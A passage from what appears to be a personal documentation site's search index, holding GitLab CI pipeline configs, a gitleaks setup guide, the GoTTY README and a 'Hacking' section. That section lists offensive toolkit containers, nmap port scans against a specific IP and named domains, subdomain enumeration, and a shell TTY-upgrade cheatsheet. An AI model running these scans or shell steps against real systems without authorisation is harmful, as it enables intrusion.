\"Version $VERSION\";\n        git push api-origin $VERSION;\n        exit 0;\n      else\n        git tag -a $VERSION -m \"Version $VERSION\";\n        git push api-origin $VERSION;\n      fi\n  only:\n    - main\n\nMCS:\n  stage: MCS\n  image: bitnami/git:latest\n  variables:\n    BRANCH:\n      value: ''\n    TAG:\n      value: ''\n  rules:\n    - if: '$BRANCH != \"\" &amp;&amp; $TAG != \"\"'\n  tags:\n    - docker\n  cache: {}\n  when: manual\n  before_script:\n    - export TAG=$TAG\n    - git config --global user.name \"${GITLAB_USER_NAME}\"\n    - git config --global user.email \"${GITLAB_USER_EMAIL}\"\n    - &gt;\n      if [ -d \"./megacomputer-scripts/.git\" ]; then\n        cd ./megacomputer-scripts;\n        git fetch --all;\n        git status;\n        git pull;\n      else\n        git clone https://0auth2:$MCS_TOKEN@gitlab.com/cartier-lab/megacomputer-scripts.git;\n        cd ./megacomputer-scripts;\n        git fetch --all;\n        git status;\n        git pull;\n      fi\n  script:\n    - &gt;\n      if ! git checkout \"$BRANCH\"; then\n        echo \"Creando rama\";\n        git checkout -b $BRANCH;\n        git status;\n        cat $DOCKER_COMPOSE_DEV &gt; ./config/docker-compose.yml.new;\n        sed 's/$TAG/'\"$TAG\"'/' ./config/docker-compose.yml.new &gt; ./config/docker-compose.yml\n        rm ./config/docker-compose.yml.new\n        git add *;\n        git commit -m \"Updated docker compose\";\n      else\n        echo \"La rama existe\";\n        git status;\n        cat $DOCKER_COMPOSE_DEV &gt; ./config/docker-compose.yml.new;\n        sed 's/$TAG/'\"$TAG\"'/' ./config/docker-compose.yml.new &gt; ./config/docker-compose.yml\n        rm ./config/docker-compose.yml.new\n        git add *;\n        git commit -m \"Updated docker compose\"\n      fi\n    - &gt;\n      if ! git push origin $BRANCH; then\n        git push -f origin $BRANCH;\n      fi\n\nbuild-tokyo:\n  stage: build\n  image: node:16-alpine3.14\n  tags:\n    - docker\n  script:\n    - npm install\n    - npm run build\n    - cd public\n    - npm install --omit-dev\n    - npm run build\n  allow_failure: false\n  cache:\n    paths:\n      - node_modules/\n      - public/node_modules/\n  artifacts:\n    expire_in: 1 days\n    when: on_success\n    paths:\n      - node_modules/\n      - public/node_modules/\n      - dist/\n      - public/build/\n  only:\n    - tokyo\n\npackage-tokyo:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - docker\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n  script:\n    - docker build . --tag $CI_REGISTRY_IMAGE:tokyo-latest --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:tokyo-latest\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  allow_failure: false\n  dependencies:\n    - build-tokyo\n  only:\n    - tokyo\n</code></pre>"},{"location":"Gitlab/pipeOverlay/","title":"pipeOverlay","text":"<pre><code>image: docker:latest\nservices:\n  - docker:dind\n\n\nvariables:\n  DOCKER_DRIVER: overlay\n  SPRING_PROFILES_ACTIVE: gitlab-ci\n  MAVEN_CLI_OPTS: \"-s .m2/settings.xml --batch-mode\"\n  MAVEN_OPTS: \"-Dmaven.repo.local=.m2/repository\"\n\n\ncache: \n    paths:\n    - .m2/repository/\n    - target/\n\n\nstages:\n  - build\n  - test\n  - codecoverage\n  - codeQuality\n  - package\n  - deploy\n\n\ninclude:\n   - template: SAST.gitlab-ci.yml\n   - template: Code-Quality.gitlab-ci.yml\n\n\nbuild:\n    image: maven:3.5-jdk-8-alpine\n    stage: build \n    script:   \n        - mvn compile\n        - ls target/generated-sources\n    artifacts: \n        paths: \n         - target/*.war\n\n\nunittests:\n    image: maven:3.5-jdk-8-alpine\n    stage: test \n    script: \n        - mvn $MAVEN_CLI_OPTS test \n    artifacts:\n        reports:\n            junit:\n                - target/surefire-reports/TEST-*.xml\n\n\ncode_quality:\n   stage: codeQuality\n   artifacts:\n     reports:\n       codequality: gl-code-quality-report.json\n   after_script:\n     - cat gl-code-quality-report.json\n\n\nspotbugs-sast:\n  dependencies:\n    - build\n  script:\n    - /analyzer run -compile=false\n  variables:\n    MAVEN_REPO_PATH: ./.m2/repository\n  artifacts:\n    reports:\n      sast: gl-sast-report.json\n\n\ncodecoverage:\n    image: maven:3.5-jdk-8-alpine\n    stage: codecoverage\n    script:\n        - mvn clean verify\n    artifacts:\n        paths:\n            - target/site/jacoco/index.html\n\n\ndocker-build:\n  stage: package\n  script:\n    - docker login -u gitlab-ci-token -p $CI_BUILD_TOKEN registry.gitlab.com\n    - docker build -t registry.gitlab.com/ishitasinghal/messageboard . --build-arg BUILDKIT_INLINE_CACHE=1 \n    - docker push registry.gitlab.com/ishitasinghal/messageboard\n\n\nk8s-deploy:\n image: google/cloud-sdk:latest\n stage: deploy\n script:\n - echo \"$GOOGLE_KEY\" &gt; key.json\n - gcloud auth activate-service-account ishita-singhal@my-project-ishita.iam.gserviceaccount.com --key-file key.json\n - gcloud container clusters get-credentials cluster-1-ishita --zone us-central1-c --project my-project-ishita\n - kubectl delete secret $DPRK_SECRET_KEY_NAME 2&gt;/dev/null || echo \"secret does not exist\"\n - kubectl create secret docker-registry $DPRK_SECRET_KEY_NAME --docker-username=\"$DPRK_DOCKERHUB_INTEGRATION_USERNAME\" --docker-password=\"$DPRK_DOCKERHUB_INTEGRATION_PASSWORD\" --docker-email=\"$DPRK_DOCKERHUB_INTEGRATION_EMAIL\" --docker-server=\"$DPRK_DOCKERHUB_INTEGRATION_URL\"/\n - kubectl apply -f deployment.yml\n</code></pre>"},{"location":"Gitlab/pipelineExample/","title":"pipelineExample","text":"<pre><code>stages:\n  - buildQA\n  - buildDEV\n  - buildUAT\n  - test\n  - docker-build\n  - deploy\n  - registry\n  - publish\n  - package-registry\n\ntagging:\n  tags:\n    - shell-devqa\n  stage: publish\n  only:\n    - UAT\n  before_script:\n    - git config --global user.name \"${GITLAB_USER_NAME}\"\n    - git config --global user.email \"${GITLAB_USER_EMAIL}\"\n  script:\n    - cd /home/gitlab-runner/UAT/mybts_fe\n    - git status\n    - git pull origin UAT\n    - tag=$(cat tagversion.json | grep version | grep -Eo \"[[:digit:]]+\\.[[:digit:]]+\\.[[:digit:]]\")\n    - git tag \"$tag\"\n    - git push --tags\n  allow_failure:\n    exit_codes: 1\n\npackage-registry:\n  image: node:latest\n  stage: package-registry\n  tags:\n    - htzdoc\n  script:\n    - echo \"//${CI_SERVER_HOST}/api/v4/projects/${CI_PROJECT_ID}/packages/npm/:_authToken=${REGISTRY_TOKEN}\"&gt;&gt;.npmrc\n    - echo \"@rafaelm:registry https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\"&gt;&gt;.npmrc\n    - echo \"registry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\"&gt;&gt;.npmrc\n    - cat .npmrc\n    - npm config set @rafaelm:registry https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\n    - npm config set -- '//gitlab.bluetrail.software/api/v4/projects/486/packages/npm/:_authToken' \"$REGISTRY_TOKEN\"\n    - npm publish --registry=https://gitlab.bluetrail.software/api/v4/projects/486/packages/npm/\n  environment: development\n  only:\n    changes:\n      - /package.json\n      - package.json\n\n\nbuildQA:\n  stage: buildQA\n  tags:\n    - htzdoc\n  image: node:16.14.0\n  script:\n    - echo \"Start building App\"\n    - npm ci --silent\n    - npm install react-scripts --silent@3.4.1 -g --silent\n    - cat $ENV_QA &gt;&gt; .env.production\n    - GENERATE_SOURCEMAP=false\n    - NODE_OPTIONS=\\\"--max-old-space-size=2048\\\"\n    - node --max-old-space-size=2048\n  allow_failure:\n    exit_codes: 1\n  after_script:\n    - npm run build --max-old-space-size=2048\n  artifacts:\n    name: \"QA build\"\n    paths:\n      - build/*\n    expire_in: 1 min\n    when: on_success\n  only:\n    - QA\n\nbuildDEV:\n  stage: buildDEV\n  tags:\n    - htzdoc\n  image: node:16.14.0\n  script:\n    - echo \"Start building App\"\n    - npm ci --silent\n    - npm install react-scripts --silent@3.4.1 -g --silent\n    - cat $ENV_DEV &gt;&gt; .env.production\n    - GENERATE_SOURCEMAP=false\n    - NODE_OPTIONS=\\\"--max-old-space-size=2048\\\"\n    - node --max-old-space-size=2048\n  allow_failure:\n    exit_codes: 1\n  after_script:\n    - npm run build --max-old-space-size=2048\n  artifacts:\n    name: \"DEV build\"\n    paths:\n      - build/*\n    expire_in: 1 min\n    when: on_success\n  only:\n    - DEV\n    - DEVTEST\n\nbuildUAT:\n  stage: buildUAT\n  tags:\n    - htzdoc\n  image: node:16.14.0\n  script:\n    - echo \"Start building App\"\n    - npm ci --silent\n    - npm install react-scripts --silent@3.4.1 -g --silent\n    - cat $ENV_UAT &gt;&gt; .env.production\n    - GENERATE_SOURCEMAP=false\n    - NODE_OPTIONS=\\\"--max-old-space-size=2048\\\"\n    - node --max-old-space-size=2048\n\n  allow_failure:\n    exit_codes: 1\n  after_script:\n    - npm run build --max-old-space-size=2048\n  artifacts:\n    name: \"UAT build\"\n    paths:\n      - build/*\n    expire_in: 1 min\n    when: on_success\n  only:\n    - UAT\n\ndeploy:\n  stage: deploy\n  tags:\n    - shell-devqa\n  before_script:\n    - echo \"$PASSWORD\" | sudo -S chown -R gitlab-runner /var/run/docker.sock\n    - rm -rf /home/gitlab-runner/$CI_COMMIT_BRANCH/nginx/*\n    - echo \"Deleted Old Version\"\n  script:\n    - cp -r build/* /home/gitlab-runner/$CI_COMMIT_BRANCH/nginx\n  after_script:\n    - echo \"Deploy Complete!\"\n  only:\n    - QA\n    - DEV\n    - UAT\n\n\n# deploy:\n#   stage: deploy\n#   image: kroniak/ssh-client\n#   before_script:\n#     - echo \"deploying app\"\n#   script:\n#     - chmod 400 $SSH_PRIVATE_KEY\n#     - ssh -o StrictHostKeyChecking=no -i $SSH_PRIVATE_KEY root@$PROD_SERVER_IP \"docker pull registry.gitlab.com/alfredomartinezzz/budgefy\"\n#     - ssh -o StrictHostKeyChecking=no -i $SSH_PRIVATE_KEY root@$PROD_SERVER_IP \"docker stop budgefycontainer || true &amp;&amp; docker rm budgefycontainer || true\"\n#     - ssh -o StrictHostKeyChecking=no -i $SSH_PRIVATE_KEY root@$PROD_SERVER_IP \"docker run -p 3001:80 -d --name budgefycontainer registry.gitlab.com/alfredomartinezzz/budgefy\"\n</code></pre> <pre><code>variables:\n  DOCKER_DRIVER: overlay2\n  DOCKER_TLS_CERTDIR: \"\"\n  PG_HOST: postgres\n  PG_PORT: 5432\n  POSTGRES_DB: alg_database\n  POSTGRES_USER: postgres\n  POSTGRES_PASSWORD: \"123456\"\n  POSTGRES_HOST_AUTH_METHOD: trust\n\nstages:\n  - build\n  - test\n  - package\n  - tag\n\nservices:\n  - postgres:13-alpine\n\nbuild:\n  stage: build\n  image: node:16-alpine3.14\n  tags:\n    - gcp-improvments\n  script:\n    - npm install\n    - npm run build\n    - cd public\n    - npm install --omit-dev\n    - npm run build\n  allow_failure: false\n  cache:\n    paths:\n      - node_modules/\n      - public/node_modules/\n  artifacts:\n    expire_in: 1 days\n    when: on_success\n    paths:\n      - node_modules/\n      - public/node_modules/\n      - dist/\n      - public/build/\n  # rules:\n  #   - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n  only:\n    - LG-453\n\ntest:\n  stage: test\n  dependencies:\n    - build\n  image: node:16-alpine3.14\n  coverage: /All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/\n  services:\n   - postgres\n  tags:\n    - gcp-improvments\n  script:\n    - npm run autotest\n  allow_failure: false\n  artifacts:\n    when: always\n    reports:\n      junit:\n        - junit.xml\n  rules:\n    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'\n\npackage:\n  stage: package\n  image: docker:latest\n  services:\n    - docker:dind\n  tags:\n    - gcp-improvments\n  before_script:\n    - docker info\n    - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n    - VERSION=\"$(cat ./changelog/version.md)\"\n  script:\n    # - docker build . --tag $CI_REGISTRY_IMAGE:latest-test --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker build . --tag $CI_REGISTRY_IMAGE:$VERSION\n    # - docker push $CI_REGISTRY_IMAGE:latest-test\n    - docker push $CI_REGISTRY_IMAGE:$VERSION\n    # - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  allow_failure: false\n  # dependencies:\n  #   - test\n  only:\n    refs:\n      - LG-453\ntag:\n  tags:\n    - gcp-improvments\n  stage: tag\n  image: bitnami/git:latest\n  allow_failure: true\n  dependencies:\n    - \"package\"\n  script:\n    - VERSION=\"$(cat ./changelog/version.md)\";\n    - echo $VERSION\n    - git config --global user.name \"${GITLAB_USER_NAME}\"\n    - git config --global user.email \"${GITLAB_USER_EMAIL}\"\n    - &gt;\n      if [ \"$(git remote -v | grep 'api-origin')\" ]; then\n        echo \"Remote has been re-established\";\n        git remote remove api-origin;\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      else\n        echo \"Remote has been created\"\n        git remote add api-origin https://oauth2:${TAG_TOKEN}@gitlab.com/cartier-lab/alg-backend;\n      fi\n    - &gt;\n      if [ $(git tag -l \"$VERSION\") ]; then\n        echo \"Version $VERSION already exists\";\n        exit 1;\n      else\n        git tag -a $VERSION -m \"Version $VERSION\";\n        git push api-origin $VERSION;\n      fi\n  only: \n    - LG-453\n\n# build-tokyo:\n#   stage: build\n#   image: node:16-alpine3.14\n#   tags:\n#     - docker\n#   script:\n#     - npm install\n#     - npm run build\n#     - cd public\n#     - npm install --omit-dev\n#     - npm run build\n#   allow_failure: false\n#   cache:\n#     paths:\n#       - node_modules/\n#       - public/node_modules/\n#   artifacts:\n#     expire_in: 1 days\n#     when: on_success\n#     paths:\n#       - node_modules/\n#       - public/node_modules/\n#       - dist/\n#       - public/build/\n#   only:\n#     - tokyo\n\n# package-tokyo:\n#   stage: package\n#   image: docker:latest\n#   services:\n#     - docker:dind\n#   tags:\n#     - docker\n#   before_script:\n#     - docker info\n#     - echo -n $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY\n#   script:\n#     - docker build . --tag $CI_REGISTRY_IMAGE:tokyo-latest --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n#     - docker push $CI_REGISTRY_IMAGE:tokyo-latest\n#     - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_REF_NAME\n#     - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n#   allow_failure: false\n#   dependencies:\n#     - build-tokyo\n#   only:\n#     - tokyo\n</code></pre>"},{"location":"Gitleaks/Install/","title":"Install","text":"<p>These instructions are intended to be followed in a development/localhost environment to guarantee that the committed changes are not leaking secrets.</p> <p>gitleaks has support for Github Actions: [![(https://github.com/fluidicon.png)</p>"},{"location":"Gitleaks/Install/#requirements","title":"Requirements:","text":"<ul> <li>Python3.8^</li> <li>gitleaks</li> <li>pre-commit python library</li> </ul>"},{"location":"Gitleaks/Install/#setup","title":"Setup","text":"<ol> <li>Install pre-commit </li> </ol> <p><code>python -m pip install pre-commit</code></p> <ol> <li>Navigate to the root folder of the repository and create a <code>.pre-commit-config.yaml</code> file with the following content: </li> </ol> <pre><code>repos:\n  - repo: local\n    hooks:\n      - id: gitleaks\n        name: check for secrets\n        entry: gitleaks detect --verbose\n        language: system\n</code></pre> <ol> <li>Setup the git hook </li> </ol> <pre><code>pre-commit autoupdate &amp;&amp; pre-commit install\n</code></pre> <p>With this setup, every time you invoke the <code>git commit</code> command, the hook will be called and the repository will be scanned for secrets or passwords.</p>"},{"location":"Gitleaks/Install/#additional-information","title":"Additional information","text":"<p>Given the fact that we rely on different <code>.env</code> files for development and testing purposes, it is possible to add the <code>exclude</code> attribute within the <code>pre-commit-config.yaml</code> file to skip these in case it is necessary to add them.</p>"},{"location":"Gitleaks/Install/#installation-via-scripts","title":"Installation via Scripts","text":"<p>We have a new folder in the repostory named .gitleaks inside we have a copuple of scripts to setup our pecommit.</p> <p>First of all execute gitleaks installation and after that the precommit installation.</p>"},{"location":"Gitleaks/Install/#troubleshooting","title":"Troubleshooting","text":"<p>Gitleaks detecting me old leaks:</p> <p>In this case we have to update the baseline, sometimes it can happen if we are working on an old branch or some secret was pushed into another branch that was merged to develop or main. We just need to update the gitleaks baseline with this command.</p> <pre><code>gitleaks detect --report-path ./baseline.json\n</code></pre> <p>After you push all the changes applied to the baseline file and its attached job.</p> <p>I want to make sure that I don\u2019t have any leak in my code.</p> <p>Before committing your job you can scan your branch manually with this command.</p> <pre><code>gitleaks detect -b baseline.json -v\n</code></pre> <p>If you detect any new leaks, contact your repository administrator or manager to revoke this leaked secret.</p>"},{"location":"Gotty%28SSH%29/gotty/","title":"GoTTY - Share your terminal as a web application","text":"<p>GoTTY is a simple command line tool that turns your CLI tools into web applications.</p> <p></p>"},{"location":"Gotty%28SSH%29/gotty/#installation","title":"Installation","text":"<p>Download the latest stable binary file from the Releases page. Note that the release marked <code>Pre-release</code> is built for testing purpose, which can include unstable or breaking changes. Download a release marked Latest release for a stabale build.</p> <p>(Files named with <code>darwin_amd64</code> are for Mac OS X users)</p>"},{"location":"Gotty%28SSH%29/gotty/#homebrew-installation","title":"Homebrew Installation","text":"<p>You can install GoTTY with Homebrew as well.</p> <pre><code>$ brew install yudai/gotty/gotty\n</code></pre>"},{"location":"Gotty%28SSH%29/gotty/#go-get-installation-development","title":"<code>go get</code> Installation (Development)","text":"<p>If you have a Go language environment, you can install GoTTY with the <code>go get</code> command. However, this command builds a binary file from the latest master branch, which can include unstable or breaking changes. GoTTY requires go1.9 or later.</p> <pre><code>$ go get github.com/yudai/gotty\n</code></pre>"},{"location":"Gotty%28SSH%29/gotty/#usage","title":"Usage","text":"<pre><code>Usage: gotty [options] &lt;command&gt; [&lt;arguments...&gt;]\n</code></pre> <p>Run <code>gotty</code> with your preferred command as its arguments (e.g. <code>gotty top</code>).</p> <p>By default, GoTTY starts a web server at port 8080. Open the URL on your web browser and you can see the running command as if it were running on your terminal.</p>"},{"location":"Gotty%28SSH%29/gotty/#options","title":"Options","text":"<pre><code>--address value, -a value     IP address to listen (default: \"0.0.0.0\") [$GOTTY_ADDRESS]\n--port value, -p value        Port number to liten (default: \"8080\") [$GOTTY_PORT]\n--permit-write, -w            Permit clients to write to the TTY (BE CAREFUL) [$GOTTY_PERMIT_WRITE]\n--credential value, -c value  Credential for Basic Authentication (ex: user:pass, default disabled) [$GOTTY_CREDENTIAL]\n--random-url, -r              Add a random string to the URL [$GOTTY_RANDOM_URL]\n--random-url-length value     Random URL length (default: 8) [$GOTTY_RANDOM_URL_LENGTH]\n--tls, -t                     Enable TLS/SSL [$GOTTY_TLS]\n--tls-crt value               TLS/SSL certificate file path (default: \"~/.gotty.crt\") [$GOTTY_TLS_CRT]\n--tls-key value               TLS/SSL key file path (default: \"~/.gotty.key\") [$GOTTY_TLS_KEY]\n--tls-ca-crt value            TLS/SSL CA certificate file for client certifications (default: \"~/.gotty.ca.crt\") [$GOTTY_TLS_CA_CRT]\n--index value                 Custom index.html file [$GOTTY_INDEX]\n--title-format value          Title format of browser window (default: \"{{ .command }}@{{ .hostname }}\") [$GOTTY_TITLE_FORMAT]\n--reconnect                   Enable reconnection [$GOTTY_RECONNECT]\n--reconnect-time value        Time to reconnect (default: 10) [$GOTTY_RECONNECT_TIME]\n--max-connection value        Maximum connection to gotty (default: 0) [$GOTTY_MAX_CONNECTION]\n--once                        Accept only one client and exit on disconnection [$GOTTY_ONCE]\n--timeout value               Timeout seconds for waiting a client(0 to disable) (default: 0) [$GOTTY_TIMEOUT]\n--permit-arguments            Permit clients to send command line arguments in URL (e.g. http://example.com:8080/?arg=AAA&amp;arg=BBB) [$GOTTY_PERMIT_ARGUMENTS]\n--width value                 Static width of the screen, 0(default) means dynamically resize (default: 0) [$GOTTY_WIDTH]\n--height value                Static height of the screen, 0(default) means dynamically resize (default: 0) [$GOTTY_HEIGHT]\n--ws-origin value             A regular expression that matches origin URLs to be accepted by WebSocket. No cross origin requests are acceptable by default [$GOTTY_WS_ORIGIN]\n--term value                  Terminal name to use on the browser, one of xterm or hterm. (default: \"xterm\") [$GOTTY_TERM]\n--close-signal value          Signal sent to the command process when gotty close it (default: SIGHUP) (default: 1) [$GOTTY_CLOSE_SIGNAL]\n--close-timeout value         Time in seconds to force kill process after client is disconnected (default: -1) (default: -1) [$GOTTY_CLOSE_TIMEOUT]\n--config value                Config file path (default: \"~/.gotty\") [$GOTTY_CONFIG]\n--version, -v                 print the version\n</code></pre>"},{"location":"Gotty%28SSH%29/gotty/#config-file","title":"Config File","text":"<p>You can customize default options and your terminal (hterm) by providing a config file to the <code>gotty</code> command. GoTTY loads a profile file at <code>~/.gotty</code> by default when it exists.</p> <pre><code>// Listen at port 9000 by default\nport = \"9000\"\n\n// Enable TSL/SSL by default\nenable_tls = true\n\n// hterm preferences\n// Smaller font and a little bit bluer background color\npreferences {\n    font_size = 5\n    background_color = \"rgb(16, 16, 32)\"\n}\n</code></pre> <p>See the <code>.gotty</code> file in this repository for the list of configuration options.</p>"},{"location":"Gotty%28SSH%29/gotty/#security-options","title":"Security Options","text":"<p>By default, GoTTY doesn't allow clients to send any keystrokes or commands except terminal window resizing. When you want to permit clients to write input to the TTY, add the <code>-w</code> option. However, accepting input from remote clients is dangerous for most commands. When you need interaction with the TTY for some reasons, consider starting GoTTY with tmux or GNU Screen and run your command on it (see \"Sharing with Multiple Clients\" section for detail).</p> <p>To restrict client access, you can use the <code>-c</code> option to enable the basic authentication. With this option, clients need to input the specified username and password to connect to the GoTTY server. Note that the credentical will be transmitted between the server and clients in plain text. For more strict authentication, consider the SSL/TLS client certificate authentication described below.</p> <p>The <code>-r</code> option is a little bit casualer way to restrict access. With this option, GoTTY generates a random URL so that only people who know the URL can get access to the server.  </p> <p>All traffic between the server and clients are NOT encrypted by default. When you send secret information through GoTTY, we strongly recommend you use the <code>-t</code> option which enables TLS/SSL on the session. By default, GoTTY loads the crt and key files placed at <code>~/.gotty.crt</code> and <code>~/.gotty.key</code>. You can overwrite these file paths with the <code>--tls-crt</code> and <code>--tls-key</code> options. When you need to generate a self-signed certification file, you can use the <code>openssl</code> command.</p> <pre><code>openssl req -x509 -nodes -days 9999 -newkey rsa:2048 -keyout ~/.gotty.key -out ~/.gotty.crt\n</code></pre> <p>(NOTE: For Safari uses, see how to enable self-signed certificates for WebSockets when use self-signed certificates)</p> <p>For additional security, you can use the SSL/TLS client certificate authentication by providing a CA certificate file to the <code>--tls-ca-crt</code> option (this option requires the <code>-t</code> or <code>--tls</code> to be set). This option requires all clients to send valid client certificates that are signed by the specified certification authority.</p>"},{"location":"Gotty%28SSH%29/gotty/#sharing-with-multiple-clients","title":"Sharing with Multiple Clients","text":"<p>GoTTY starts a new process with the given command when a new client connects to the server. This means users cannot share a single terminal with others by default. However, you can use terminal multiplexers for sharing a single process with multiple clients.</p> <p>For example, you can start a new tmux session named <code>gotty</code> with <code>top</code> command by the command below.</p> <pre><code>$ gotty tmux new -A -s gotty top\n</code></pre> <p>This command doesn't allow clients to send keystrokes, however, you can attach the session from your local terminal and run operations like switching the mode of the <code>top</code> command. To connect to the tmux session from your terminal, you can use following command.</p> <pre><code>$ tmux new -A -s gotty\n</code></pre> <p>By using terminal multiplexers, you can have the control of your terminal and allow clients to just see your screen.</p>"},{"location":"Gotty%28SSH%29/gotty/#quick-sharing-on-tmux","title":"Quick Sharing on tmux","text":"<p>To share your current session with others by a shortcut key, you can add a line like below to your <code>.tmux.conf</code>.</p> <pre><code># Start GoTTY in a new window with C-t\nbind-key C-t new-window \"gotty tmux attach -t `tmux display -p '#S'`\"\n</code></pre>"},{"location":"Gotty%28SSH%29/gotty/#playing-with-docker","title":"Playing with Docker","text":"<p>When you want to create a jailed environment for each client, you can use Docker containers like following:</p> <pre><code>$ gotty -w docker run -it --rm busybox\n</code></pre>"},{"location":"Gotty%28SSH%29/gotty/#development","title":"Development","text":"<p>You can build a binary using the following commands. Windows is not supported now. go1.9 is required.</p> <pre><code># Install tools\ngo get github.com/jteeuwen/go-bindata/...\ngo get github.com/tools/godep\n\n# Build\nmake\n</code></pre> <p>To build the frontend part (JS files and other static files), you need <code>npm</code>.</p>"},{"location":"Gotty%28SSH%29/gotty/#architecture","title":"Architecture","text":"<p>GoTTY uses xterm.js and hterm to run a JavaScript based terminal on web browsers. GoTTY itself provides a websocket server that simply relays output from the TTY to clients and receives input from clients and forwards it to the TTY. This hterm + websocket idea is inspired by Wetty.</p>"},{"location":"Gotty%28SSH%29/gotty/#alternatives","title":"Alternatives","text":""},{"location":"Gotty%28SSH%29/gotty/#command-line-client","title":"Command line client","text":"<ul> <li>gotty-client: If you want to connect to GoTTY server from your terminal</li> </ul>"},{"location":"Gotty%28SSH%29/gotty/#terminalssh-on-web-browsers","title":"Terminal/SSH on Web Browsers","text":"<ul> <li>Secure Shell (Chrome App): If you are a chrome user and need a \"real\" SSH client on your web browser, perhaps the Secure Shell app is what you want</li> <li>Wetty: Node based web terminal (SSH/login)</li> <li>ttyd: C port of GoTTY with CJK and IME support</li> </ul>"},{"location":"Gotty%28SSH%29/gotty/#terminal-sharing","title":"Terminal Sharing","text":"<ul> <li>tmate: Forked-Tmux based Terminal-Terminal sharing</li> <li>termshare: Terminal-Terminal sharing through a HTTP server</li> <li>tmux: Tmux itself also supports TTY sharing through SSH)</li> </ul>"},{"location":"Gotty%28SSH%29/gotty/#license","title":"License","text":"<p>The MIT License</p>"},{"location":"Hacking/DockerTools/","title":"DockerTools","text":""},{"location":"Hacking/DockerTools/#bug-bounty-toolkit","title":"Bug Bounty Toolkit","text":"<pre><code>docker pull warch/social-engineering-toolkit\n</code></pre> <pre><code>docker pull hackersploit/bugbountytoolkit\n\ndocker run -it hackersploit/bugbountytoolkit /bin/bash\n\ndocker run -it hackersploit/bugbountytoolkit /bin/bash\n\ndocker run -it hackersploit/bugbountytoolkit /usr/bin/zsh\n</code></pre>"},{"location":"Hacking/DockerTools/#owasp-juice-shop-lab","title":"OWASP Juice Shop (lab)","text":"<pre><code>docker run --rm -p 3000:3000 bkimminich/juice-shop\n</code></pre>"},{"location":"Hacking/DockerTools/#kasmwebkali","title":"kasmweb/kali","text":"<pre><code>docker pull kasmweb/kali\n\nsudo docker run --rm  -it --shm-size=512m -p 6901:6901 -e VNC_PW=password kasmweb/kali\n</code></pre> <p>The container is now accessible via a browser : <code>https://&lt;IP&gt;:6901</code></p> <ul> <li>User : <code>kasm_user</code></li> <li>Password: <code>password</code></li> </ul>"},{"location":"Hacking/DockerTools/#seeker","title":"Seeker","text":"<p><code>https://github.com/thewhiteh4t/seeker.git</code></p> <p>Metasploit</p> <pre><code>sudo docker run --rm -it --name=metasploit metasploitframework/metasploit-framework:latest\n</code></pre>"},{"location":"Hacking/Steps/","title":"Steps","text":"<p>Scan steps</p> <pre><code>nmap -iL domains.txt -p-\nnmap -iL domains.txt -T5 -p- --min-rate 100 --open -oA output\nsudo nmap -p- --open --min-rate 5000 -n -sS -vvv -Pn 95.217.210.147 -oG allPorts\nsudo nmap -p- --open -T5 -sS -vvv -Pn -n 95.217.210.147 -oG allPorts\nnmap --script resolveall --script-args newtargets,resolveall.hosts=eulog.3irobotics.net\n</code></pre> <p>extractPorts</p> <pre><code>function extractPorts(){\n    ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')\"\n    ip_address=\"$(cat $1 | grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' | sort -u | head -n 1)\"\n    echo -e \"\\n[*] Extracting information...\\n\" &gt; extractPorts.tmp\n    echo -e \"\\t[*] IP Address: $ip_address\"  &gt;&gt; extractPorts.tmp\n    echo -e \"\\t[*] Open ports: $ports\\n\"  &gt;&gt; extractPorts.tmp\n    echo $ports | tr -d '\\n' | xclip -sel clip\n    echo -e \"[*] Ports copied to clipboard\\n\"  &gt;&gt; extractPorts.tmp\n    cat extractPorts.tmp; rm extractPorts.tmp\n}\n</code></pre> <p>Discover</p> <pre><code>sudo nmap -p22,80,443 -sCV bluetrail.software -oN targeted\n</code></pre>"},{"location":"Hacking/Steps/#subfinder","title":"Subfinder","text":"<pre><code>\u25b6 Enumerate/Collect all subdomains using tools like subfinder, assetfinder, Knockpy and haktrails, etc.\n\nRun : subfinder -d someweb.com -o subf.txt -v\n\nRun : echo \u201csomeweb.com\u201d | haktrails subdomains &gt; haksubs.txt\n\nRun : assetfinder -subs-only someweb.com &gt; asset.txt\n\n\u25b6 Add all Enumerated/Collected subdomains from different tools in different files into one file with unique subdomains, that may be subdomains.txt\n\nRun : cat subf.txt haksubs.txt asset.txt | sort -u &gt; subdomains.txt\n\n\u25b6 Now, will check the identified subdomains are active or not -\n\nRun : httpx -l subdomains.txt -o activesubs.txt -threads 200 -status-code -follow-redirects\n</code></pre>"},{"location":"Hacking/cheatsheet/","title":"Cheatsheet","text":""},{"location":"Hacking/cheatsheet/#tratamiento-de-la-tty","title":"Tratamiento de la tty","text":"<p>Realizaremos un breve tratamiento de la tty para poder operar de forma c\u00f3moda sobre la consola. Los comandos a ejecutar:</p> <pre><code>script /dev/null -c bash   \n</code></pre> <p>(hacemos  ctrl  +  Z)</p> <pre><code>stty raw -echo; fg\nreset 